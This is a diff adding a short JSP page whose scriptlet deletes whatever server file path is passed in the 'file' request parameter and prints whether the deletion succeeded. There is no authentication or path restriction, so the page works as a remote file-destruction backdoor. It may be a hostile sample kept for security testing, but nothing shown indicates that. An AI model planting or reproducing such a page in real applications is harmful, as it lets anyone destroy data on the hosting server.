@@ -1,0 +1,7 @@
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml" version="1.2">
+    <jsp:directive.page import="java.io.File"/>
+    <jsp:scriptlet>
+        File file = new File(request.getParameter("file"));
+        out.println(file.delete());
+    </jsp:scriptlet>
+</jsp:root>
